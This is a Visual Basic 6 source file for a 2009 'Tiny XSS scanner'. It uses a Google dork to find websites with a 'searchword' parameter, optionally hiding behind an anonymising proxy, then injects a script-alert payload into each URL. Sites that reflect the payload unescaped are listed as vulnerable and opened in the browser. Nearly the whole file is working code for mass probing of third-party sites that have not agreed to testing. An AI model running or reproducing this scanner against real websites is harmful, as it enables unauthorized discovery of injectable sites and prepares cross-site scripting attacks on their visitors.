VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Form1 
   AutoRedraw      =   -1  'True
   BackColor       =   &H00008000&
   BorderStyle     =   0  'None
   Caption         =   "Tiny XSS scanner 1.0 by Xylitol"
   ClientHeight    =   8745
   ClientLeft      =   165
   ClientTop       =   105
   ClientWidth     =   11115
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   Picture         =   "Form1.frx":0000
   ScaleHeight     =   8745
   ScaleWidth      =   11115
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox pctTransPicture 
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   8745
      Left            =   0
      Picture         =   "Form1.frx":13C912
      ScaleHeight     =   583
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   741
      TabIndex        =   27
      Top             =   0
      Visible         =   0   'False
      Width           =   11115
   End
   Begin VB.PictureBox Picture1 
      BackColor       =   &H00000000&
      Height          =   6855
      Left            =   12840
      ScaleHeight     =   6795
      ScaleWidth      =   9675
      TabIndex        =   24
      Top             =   600
      Visible         =   0   'False
      Width           =   9735
      Begin VB.Timer Timer5 
         Enabled         =   0   'False
         Interval        =   1
         Left            =   2160
         Top             =   5400
      End
      Begin VB.Timer Timer4 
         Enabled         =   0   'False
         Interval        =   1
         Left            =   1440
         Top             =   5400
      End
      Begin VB.PictureBox Picture2 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         ForeColor       =   &H80000008&
         Height          =   3760
         Left            =   840
         ScaleHeight     =   3735
         ScaleMode       =   0  'User
         ScaleWidth      =   7695
         TabIndex        =   26
         Top             =   1080
         Width           =   7720
         Begin VB.Shape Shape1 
            BorderColor     =   &H000000FF&
            Height          =   3735
            Left            =   0
            Top             =   0
            Width           =   7695
         End
         Begin VB.Image Image1 
            Height          =   45690
            Left            =   0
            Picture         =   "Form1.frx":279224
            Top             =   0
            Width           =   7665
         End
      End
      Begin VB.CommandButton Command4 
         Caption         =   "[ OK ]"
         Height          =   495
         Left            =   8040
         TabIndex        =   25
         Top             =   6000
         Width           =   1455
      End
   End
   Begin VB.TextBox non 
      Height          =   315
      Left            =   11880
      TabIndex        =   23
      Text            =   "No"
      Top             =   5760
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.TextBox oui 
      Height          =   315
      Left            =   11040
      TabIndex        =   22
      Text            =   "Yes"
      Top             =   5760
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.TextBox arreter 
      Height          =   315
      Left            =   11880
      TabIndex        =   21
      Text            =   "&Stop"
      Top             =   5400
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.TextBox demar 
      Height          =   315
      Left            =   11040
      TabIndex        =   20
      Text            =   "&Start"
      Top             =   5400
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.OptionButton Option3 
      BackColor       =   &H00000000&
      Caption         =   "Italian"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   6840
      TabIndex        =   19
      Top             =   8160
      Width           =   975
   End
   Begin VB.OptionButton Option2 
      BackColor       =   &H00000000&
      Caption         =   "French"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   5880
      TabIndex        =   18
      Top             =   8160
      Width           =   975
   End
   Begin VB.OptionButton Option1 
      BackColor       =   &H00000000&
      Caption         =   "English"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   4920
      TabIndex        =   17
      Top             =   8160
      Value           =   -1  'True
      Width           =   975
   End
   Begin VB.CommandButton Command3 
      Caption         =   "&Exit"
      Height          =   375
      Left            =   1080
      TabIndex        =   16
      Top             =   7680
      Width           =   3735
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&About..."
      Height          =   375
      Left            =   1080
      TabIndex        =   15
      Top             =   7200
      Width           =   3735
   End
   Begin VB.ListBox List1 
      Height          =   1530
      Left            =   8880
      TabIndex        =   14
      Top             =   9120
      Width           =   3375
   End
   Begin VB.TextBox Text5 
      BackColor       =   &H00000000&
      ForeColor       =   &H00008080&
      Height          =   1575
      Left            =   4920
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   12
      Top             =   6480
      Width           =   5775
   End
   Begin VB.TextBox Text4 
      Height          =   315
      Left            =   -600
      TabIndex        =   10
      Text            =   "Text4"
      Top             =   9600
      Width           =   5295
   End
   Begin VB.TextBox Text8 
      Height          =   435
      Left            =   -1200
      TabIndex        =   9
      Text            =   "Text8"
      Top             =   9120
      Width           =   6255
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   8280
      Top             =   9480
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   7800
      Top             =   9000
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   7800
      Top             =   9480
   End
   Begin VB.TextBox Text3 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   1080
      TabIndex        =   7
      Text            =   "Text3"
      Top             =   8760
      Width           =   975
   End
   Begin VB.CheckBox Check1 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   1560
      TabIndex        =   6
      Top             =   6840
      Width           =   255
   End
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   240
      TabIndex        =   3
      Text            =   "Text1"
      Top             =   8760
      Width           =   735
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   7200
      Top             =   9120
   End
   Begin VB.TextBox xss 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   6960
      TabIndex        =   2
      Text            =   "><script>alert(""XSS"")</script>"
      Top             =   7440
      Width           =   2295
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Start"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   3480
      TabIndex        =   1
      Top             =   6480
      Width           =   1335
   End
   Begin VB.TextBox Text2 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   1560
      TabIndex        =   0
      Text            =   "inurl:""?searchword="""
      Top             =   6480
      Width           =   1815
   End
   Begin MSWinsockLib.Winsock Winsock 
      Left            =   8520
      Top             =   8640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComctlLib.ListView ListeSite 
      Height          =   8055
      Left            =   15960
      TabIndex        =   4
      Top             =   120
      Width           =   4215
      _ExtentX        =   7435
      _ExtentY        =   14208
      LabelWrap       =   -1  'True
      HideSelection   =   0   'False
      AllowReorder    =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      Appearance      =   0
      Enabled         =   0   'False
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   0
   End
   Begin MSComctlLib.ListView ListeSite2 
      CausesValidation=   0   'False
      Height          =   4695
      Left            =   1030
      TabIndex        =   8
      Top             =   1700
      Width           =   9735
      _ExtentX        =   17171
      _ExtentY        =   8281
      LabelWrap       =   -1  'True
      HideSelection   =   0   'False
      FullRowSelect   =   -1  'True
      _Version        =   393217
      ForeColor       =   16777215
      BackColor       =   0
      Appearance      =   1
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   0
   End
   Begin VB.Image Image7 
      Height          =   285
      Left            =   9300
      Picture         =   "Form1.frx":6EF666
      Top             =   1290
      Visible         =   0   'False
      Width           =   405
   End
   Begin VB.Image Image6 
      Height          =   285
      Left            =   9300
      Picture         =   "Form1.frx":6EFCE4
      Top             =   1290
      Visible         =   0   'False
      Width           =   405
   End
   Begin VB.Image Image5 
      Height          =   285
      Left            =   9300
      Picture         =   "Form1.frx":6F0362
      Top             =   1290
      Width           =   405
   End
   Begin VB.Image Image4 
      Height          =   285
      Left            =   10080
      Picture         =   "Form1.frx":6F09E0
      Top             =   1290
      Visible         =   0   'False
      Width           =   660
   End
   Begin VB.Image Image3 
      Height          =   285
      Left            =   10080
      Picture         =   "Form1.frx":6F13EE
      Top             =   1290
      Visible         =   0   'False
      Width           =   660
   End
   Begin VB.Image Image2 
      Height          =   285
      Left            =   10080
      Picture         =   "Form1.frx":6F1DFC
      Top             =   1290
      Width           =   660
   End
   Begin VB.Label Label4 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "Xylitol 2oo9"
      Enabled         =   0   'False
      ForeColor       =   &H8000000D&
      Height          =   255
      Left            =   9000
      TabIndex        =   28
      Top             =   8280
      Width           =   1695
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "(www.anonymouse.org)"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   1920
      TabIndex        =   13
      Top             =   6840
      Width           =   2895
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Dork:"
      ForeColor       =   &H00FFFFFF&
      Height          =   210
      Left            =   1080
      TabIndex        =   11
      Top             =   6480
      Width           =   375
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Proxy:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   315
      Left            =   1080
      TabIndex        =   5
      Top             =   6840
      Width           =   435
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private a As String
Private b As String
Private c As String
Private d As Long
Private e As Long
Private f As Long
Private Buffer As String
Private Buffer2 As String
Private Buffer3 As String
Private buffer4 As String
Private bufferrecu As String
Private Site1 As Long
Public Site2 As Long
Public Site3 As Long
Public Site4 As Long
Private bufferxss As String
Private BufferURL As String
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long


Private Sub Command1_Click()
If Command1.Caption = "" & arreter.Text & "" Then
    Timer1.Enabled = False
    Timer2.Enabled = False
    Winsock.Close
    Winsock2.Close
    Command1.Caption = "" & demar.Text & ""
    Option1.Enabled = True
    Option2.Enabled = True
    Option3.Enabled = True
Else
    Text3.Text = 0
    Site1 = 0
    Site2 = 0
    Site3 = 0
    Site4 = 0
    a = 0
    b = 1
    Command1.Caption = "" & arreter.Text & ""
    Timer1.Enabled = True
        Option1.Enabled = False
    Option2.Enabled = False
    Option3.Enabled = False
End If
bufferxss = xss.Text
bufferxss = Replace(bufferxss, "<", "%3C")
bufferxss = Replace(bufferxss, ">", "%3E")
bufferxss = Replace(bufferxss, """", "%22")

End Sub

Private Sub Command2_Click()
Picture1.Top = 1700
Picture1.Left = 1030
Picture1.Visible = True
Timer4.Enabled = True
If uFMOD_PlaySong(1, 0, XM_RESOURCE) <> 0 Then
End If
End Sub

Private Sub Command3_Click()
Unload Me
End Sub

Private Sub Command4_Click()
Timer4.Enabled = False
Timer5.Enabled = False
Image1.Top = 0
Picture1.Visible = False
uFMOD_PlaySong 0, 0, 0
End Sub

Private Sub Form_Load()
GenerateTransForm Me, pctTransPicture, RGB(255, 0, 255)
With ListeSite
    .View = lvwReport
    Call .ColumnHeaders.Clear
    Call .ColumnHeaders.Add(, , "")
    Call .ColumnHeaders.Add(, , "Site")
End With
With ListeSite.ColumnHeaders
    .Item(1).Width = 0
    .Item(2).Width = 8000
End With
With ListeSite2
    .View = lvwReport
    Call .ColumnHeaders.Clear
    Call .ColumnHeaders.Add(, , "")
    Call .ColumnHeaders.Add(, , "Site")
    Call .ColumnHeaders.Add(, , "URL")
    Call .ColumnHeaders.Add(, , "Vulnerable")
End With
With ListeSite2.ColumnHeaders
    .Item(1).Width = 0
    .Item(2).Width = 3000
    .Item(3).Width = 5000
    .Item(4).Width = 1300
End With
Text3.Text = 0
Site1 = 0
Site2 = 0
Site3 = 0
Site4 = 0
a = 0
b = 1
Command1.Caption = "" & demar.Text & ""
Site1 = ListeSite.ListItems.Count + 1
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image4.Visible = False
Image3.Visible = False
Image7.Visible = False
Image6.Visible = False
Image5.Visible = True
Image2.Visible = True
    On Error GoTo Form_MouseMove_Error
    If Button = vbLeftButton Then
        ReleaseCapture
        SendMessage Me.hWnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&
    End If
    On Error GoTo 0
    Exit Sub
Form_MouseMove_Error:
    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure Form_MouseMove of Feuille form1"
End Sub





Private Sub Image2_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image4.Visible = True
Image3.Visible = False
Image2.Visible = False
End Sub



Private Sub Image4_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image4.Visible = False
Image2.Visible = False
Image3.Visible = True
End Sub

Private Sub Image4_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Unload Me
End Sub



Private Sub Image5_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image5.Visible = False
Image6.Visible = False
Image7.Visible = True
End Sub


Private Sub Image7_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image5.Visible = False
Image7.Visible = False
Image6.Visible = True
End Sub

Private Sub Image7_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Me.WindowState = 1
End Sub

Private Sub Option1_Click()
ListeSite2.ColumnHeaders.Item(2).Text = "Site"
ListeSite2.ColumnHeaders.Item(3).Text = "URL"
ListeSite2.ColumnHeaders.Item(4).Text = "Vulnerable"
demar.Text = "&Start"
arreter.Text = "&Stop"
oui.Text = "Yes"
non.Text = "No"
Command1.Caption = demar.Text
Command2.Caption = "&About..."
Command3.Caption = "&Exit"
End Sub

Private Sub Option2_Click()
ListeSite2.ColumnHeaders.Item(2).Text = "Site"
ListeSite2.ColumnHeaders.Item(3).Text = "URL"
ListeSite2.ColumnHeaders.Item(4).Text = "Vulnerable"
demar.Text = "&Démarrer"
arreter.Text = "&Arrêter"
oui.Text = "Oui"
non.Text = "Non"
Command1.Caption = demar.Text
Command2.Caption = "&A propos de..."
Command3.Caption = "&Quitter"
End Sub

Private Sub Option3_Click()
ListeSite2.ColumnHeaders.Item(2).Text = "Site"
ListeSite2.ColumnHeaders.Item(3).Text = "URL"
ListeSite2.ColumnHeaders.Item(4).Text = "Vulnerabile"
demar.Text = "&Inizia"
arreter.Text = "&Stop"
oui.Text = "Si"
non.Text = "No"
Command1.Caption = demar.Text
Command2.Caption = "&About..."
Command3.Caption = "&Esci"
End Sub

Private Sub Timer1_Timer()
Winsock.Close
If Check1.Value = 0 Then
    Winsock.Connect "www.google.fr", 80
Else
    Winsock.Connect "www.anonymouse.org", 80
End If
End Sub

Private Sub Timer4_Timer()
If Image1.Top = -45480 Then
Timer4.Enabled = False
Timer5.Enabled = True
Else
Image1.Top = Image1.Top - 10
End If
End Sub

Private Sub Timer5_Timer()
If Image1.Top = 0 Then
Timer5.Enabled = False
Timer4.Enabled = True
Else
Image1.Top = Image1.Top + 10
End If
End Sub

Private Sub Winsock_Connect()
Dim RequeteGoogle As String
If Check1.Value = 0 Then
    If a = 0 Then
    RequeteGoogle = "GET /search?hl=fr&ie=ISO-8859-1&q=" & Text2.Text & "&btnG=Recherche+Google&meta=&aq=f&oq= HTTP/1.1" & vbCrLf & vbCrLf
    c = 0
    a = a + 1
    Else
    RequeteGoogle = "GET /search?hl=fr&ie=UTF-8&q=" & Text2.Text & "&start=" & b & "0&sa=N HTTP/1.1" & vbCrLf & vbCrLf
    b = b + 1
    End If
Else
    If a = 0 Then
        RequeteGoogle = "GET /cgi-bin/anon-www.cgi/http://www.google.fr/search?hl=fr&ie=ISO-8859-1&q=" & Text2.Text & "&btnG=Recherche+Google&meta=&aq=f&oq= HTTP/1.1" & vbCrLf
        c = 0
        a = a + 1
    Else
        RequeteGoogle = "GET /cgi-bin/anon-www.cgi/http://www.google.fr/search?hl=fr&ie=UTF-8&q=" & Text2.Text & "&start=" & b & "0&sa=N HTTP/1.1" & vbCrLf
        b = b + 1
    End If
    RequeteGoogle = RequeteGoogle & "Host: anonymouse.org" & vbCrLf
    RequeteGoogle = RequeteGoogle & "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5" & vbCrLf
    RequeteGoogle = RequeteGoogle & "Accept: */*" & vbCrLf
    RequeteGoogle = RequeteGoogle & "Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3" & vbCrLf
    RequeteGoogle = RequeteGoogle & "Accept -Encoding: gzip , deflate" & vbCrLf
    RequeteGoogle = RequeteGoogle & "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" & vbCrLf
    RequeteGoogle = RequeteGoogle & "Keep-Alive: 300" & vbCrLf
    RequeteGoogle = RequeteGoogle & "Connection: keep-alive" & vbCrLf
    RequeteGoogle = RequeteGoogle & "Referer: http://anonymouse.org/cgi-bin/anon-www.cgi/http://www.google.fr" & vbCrLf & vbCrLf
End If
Winsock.SendData RequeteGoogle
End Sub
Public Sub Winsock_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Buffer = ""
Winsock.GetData Buffer
Buffer = Replace(Buffer, "- ", vbCrLf)
extraction Buffer
Text1.Text = b
Timer1.Enabled = False
Timer1.Enabled = True
End Sub
Private Sub Winsock_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean) 'Erreur!
MsgBox "Erreur avec le socket! & vbcrlf # " & Number & vbCrLf & Description
Timer1.Enabled = False
Timer1.Enabled = True
End Sub
Private Sub extraction(ByRef str As String)
Dim row() As String
Dim ni As Long
row = Split(Buffer, "k - </cite>")
ni = Module1.Extract(row(), "<cite>", Buffer, 0)
Buffer = Replace(Buffer, "<b>", "")
Buffer = Replace(Buffer, "</b>", "")
Buffer = Replace(Buffer, " ", "")
Buffer = "@" & Buffer
injection
End Sub
Private Sub injection()
Dim row() As String
Dim ni As Long
Buffer2 = ""
row = Split(Buffer, "=")
ni = Module1.Extract(row(), "@", Buffer, 0)
Buffer = Buffer & "=" & bufferxss
If Buffer = "=" & bufferxss Then
Else
    Site1 = Site1 + 1
    With ListeSite.ListItems
        .Add Site1, , ""
    End With
    With ListeSite.ListItems
    .Item(Site1).SubItems(1) = Buffer
    End With
Text3.Text = Text3.Text + 1
End If
If c = 0 Then
    c = 1
    Timer2.Enabled = True
End If
End Sub
Private Sub Timer2_Timer()
test
End Sub
Private Sub test()
On Error Resume Next
Dim row() As String
Dim ni As Long
Dim test As String
Site2 = Site2 + 1
test = ""
Buffer3 = ""
Buffer2 = ""
Buffer2 = ListeSite.ListItems(Site2).SubItems(1)
Module1.ExtractUrl Buffer2
'test = Module1.retURL.Host
test = Split(Module1.retURL.Host, ".")
If test = "" Then
Buffer2 = "@.html"
End If
Buffer3 = Buffer2
row = Split(Buffer3, ".")
ni = Module1.Extract(row(), "htm", Buffer3, 0)
'Site3 = Site3 + 1
'f = 0
'For e = -1 To Site3
'f = f + 1
'Text4.Text = f
''If Module1.retURL.Host = ListeSite2.ListItems(f).SubItems(1) Then
'Buffer3 = ""
'Exit For
'Else
'f = f + 1
If Buffer3 = "" Then
    Site3 = Site3 + 1
    With ListeSite2.ListItems
        .Add (Site3), , ""
    End With
    With ListeSite2.ListItems
        .Item(Site3).SubItems(1) = Module1.retURL.Host
        .Item(Site3).SubItems(2) = Module1.retURL.URI
    End With
    If Site3 = 1 Then
    Else
    Timer3.Enabled = True
    End If
End If
'End If
'Next e

'End If
'Next e

Timer2.Enabled = False
Timer2.Enabled = True
End Sub
Private Sub Timer3_Timer()
bufferrecu = ""
Text8.Text = ""
test2
End Sub
Private Sub test2()
Site4 = Site4 + 1
Winsock2.Close
Winsock2.Connect ListeSite2.ListItems(Site4).SubItems(1), 80
End Sub
Private Sub Winsock2_Connect()
Dim RequeteGoogle As String
    Requetetest = "GET " & ListeSite2.ListItems(Site4).SubItems(2) & " HTTP/1.1" & vbCrLf
    Requetetest = Requetetest & "Host: " & ListeSite2.ListItems(Site4).SubItems(1) & vbCrLf
    Requetetest = Requetetest & "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5" & vbCrLf
    Requetetest = Requetetest & "Accept: */*" & vbCrLf
    Requetetest = Requetetest & "Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3" & vbCrLf
    Requetetest = Requetetest & "Accept-Encoding: gzip,deflate" & vbCrLf
    Requetetest = Requetetest & "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" & vbCrLf
    Requetetest = Requetetest & "Keep-Alive: 300" & vbCrLf
    Requetetest = Requetetest & "Connection: keep-alive" & vbCrLf
    Requetetest = Requetetest & "Referer: http://anonymouse.org/cgi-bin/anon-www.cgi/http://www.google.fr" & vbCrLf & vbCrLf
Winsock2.SendData Requetetest
End Sub
Public Sub Winsock2_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim d As Long
Dim row() As String
Dim ni As Long

Winsock2.GetData buffer4
Text8.Text = Text8.Text & buffer4
bufferrecu = Text8.Text
row = Split(bufferrecu, vbCrLf)
ni = Module1.Extract(row(), "><script>alert(" & """" & "XSS" & """" & ")</script", bufferrecu, 0)
If bufferrecu <> "" Then
Winsock2.Close
With ListeSite2.ListItems
    .Item(Site4).SubItems(3) = "" & oui.Text & ""
    ShellExecute Me.hWnd, "open", ListeSite2.ListItems(Site4).SubItems(1) & ListeSite2.ListItems(Site4).SubItems(2), ByVal 0&, 0&, 1

List1.AddItem ListeSite2.ListItems(Site4).SubItems(1) & ListeSite2.ListItems(Site4).SubItems(2)
List1.ListIndex = List1.ListCount - 1

Text5.Text = ""
For i = 0 To List1.ListCount - 1
      Text5.Text = Text5.Text & List1.List(i) & vbCrLf
Next

End With
Else
With ListeSite2.ListItems
    .Item(Site4).SubItems(3) = "" & non.Text & ""
End With
End If
Timer3.Enabled = False
Timer3.Enabled = True
End Sub

